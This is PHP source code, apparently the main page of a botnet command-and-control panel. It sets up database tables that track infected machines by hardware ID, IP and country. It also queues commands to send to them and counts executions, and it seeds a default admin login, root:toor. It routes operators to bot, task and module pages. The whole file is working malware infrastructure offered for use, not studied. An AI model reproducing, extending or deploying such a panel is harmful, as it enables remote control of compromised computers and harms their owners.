<?php
include('includes/all.inc');

// Check installation
$install = false;
if (!db_table_exists('users'))
{
	db_query('CREATE TABLE IF NOT EXISTS `users` (
			`id` int(5) NOT NULL auto_increment,
			`user` varchar(65) NOT NULL default "",
			`pwd` varchar(65) NOT NULL default "",
			`role` int(1) NOT NULL default 0,
			PRIMARY KEY (`id`)
			);');
	echo "Installed users table.<br />";
	$install = true;
}
if (!db_table_exists('settings'))
{
	db_query('CREATE TABLE IF NOT EXISTS `settings` (
			`id` int(5) NOT NULL auto_increment,
			`name` varchar(65) NOT NULL default "",
			`value` varchar(65) NOT NULL default "",
			PRIMARY KEY (`id`)
			);');
	echo "Installed settings table.<br />";
	$install = true;
}
if (!db_table_exists('sessions'))
{
	db_query('CREATE TABLE IF NOT EXISTS `sessions` (
			`id` int(5) NOT NULL auto_increment,
			`uid` int(5) NOT NULL default -1,
			`created` TIMESTAMP default CURRENT_TIMESTAMP,
			PRIMARY KEY (`id`)
			);');
	echo "Installed sessions table.<br />";
	$install = true;
}
if (!db_table_exists('bots'))
{
	db_query('CREATE TABLE IF NOT EXISTS `bots` (
			`id` int(5) NOT NULL auto_increment,
			`hwid` varchar(65) NOT NULL default "",
			`OS` varchar(65) NOT NULL default "",
			`IP` varchar(65) NOT NULL default "",
			`country` varchar(65) NOT NULL default "",
			`uid` int(5) NOT NULL default -1,
			`date` TIMESTAMP default CURRENT_TIMESTAMP,
			PRIMARY KEY (`id`)
			);
');
	echo "Installed bots table.<br />";
	$install = true;
}
if (!db_table_exists('tasks'))
{
	db_query('CREATE TABLE IF NOT EXISTS `tasks` (
			`id` int(11) NOT NULL AUTO_INCREMENT,
			`countries` TEXT,
			`command` varchar(255) NOT NULL,
			`start` TIMESTAMP NOT NULL default 0,
			`stop` TIMESTAMP NOT NULL default 0,
			`count` int(10) NOT NULL default 0,
			`received` int(10) NOT NULL default 0,
			`executed` int(10) NOT NULL default 0,
			`failed` int(10) NOT NULL default 0,
			`uid` int(5) NOT NULL default -1,
			PRIMARY KEY (`id`)
			);');
	echo "Installed tasks table.<br />";
	$install = true;
}
if (!db_table_exists('sentTasks'))
{
	db_query('CREATE TABLE IF NOT EXISTS `sentTasks` (
			`id` int(5) NOT NULL auto_increment,
			`tid` int(5) NOT NULL default -1,
			`hwid` varchar(128) NOT NULL default "",
			PRIMARY KEY (`id`)
			);');
	echo "Installed sentTasks table.<br />";
	$install = true;
}
if (!db_table_exists('error'))
{
	db_query('CREATE TABLE IF NOT EXISTS `error` (
			`id` int(5) NOT NULL auto_increment,
			`os` varchar(65) NOT NULL default "",
			`err` varchar(128) NOT NULL default "",
			`date` TIMESTAMP default CURRENT_TIMESTAMP,
			PRIMARY KEY (`id`)
			);');
	echo "Installed error table.<br />";
	$install = true;
}
if (db_table_empty('users'))
{
	db_query("INSERT INTO `users`(`user`, `pwd`, `role`) VALUES('root', :1, 1)", hash('sha256', 'toor'));
	echo "Added new admin root:toor.<br />";
	$install = true;
}
if (db_table_empty('settings'))
{
	db_query("INSERT INTO `settings`(`name`, `value`) VALUES('template', 'bootstrap')");
	echo "Added settings.<br />";
	$install = true;
}
if ($install)
	die('');


if (!isLoggedIn())
	include_once('pages/login.php');
else
{
	if (isset($_GET['p']) && $_GET['p'] == "stats")
		include_once('pages/stats.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "bots")
		include_once('pages/bots.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "tasks")
		include_once('pages/tasks.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "module")
	{
		if (getRole() > 2)
		{
			$TEMPLATE['site'] = "Modules";
			$TEMPLATE['text'] = '<div class="alert alert-danger">You don\'t have permission to see this page.</div>';
			$TEMPLATE['js'] = '';
		}
		else
			include_once('modules/'.str_replace(array('\\', '/'), '', $_GET['m']).'/page.php');
	}
	elseif (isset($_GET['p']) && $_GET['p'] == "settings")
		include_once('pages/settings.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "users")
		include_once('pages/users.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "debug")
		include_once('pages/debug.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "logout")
	{
		session_start();
		session_destroy();
		header("Location: index.php");
	}
	else
		include_once('pages/stats.php');
}
$stmt = db_query("SELECT `value` FROM `settings` WHERE `name` = 'template'");
$cnt = $stmt->rowCount();
$row = $stmt->fetch();
$template = ($cnt > 0) ? $row['value'] : 'bootstrap';
$site = isLoggedIn() ? 'main' : 'login';
include_once("template/{$template}-{$site}.php");
?>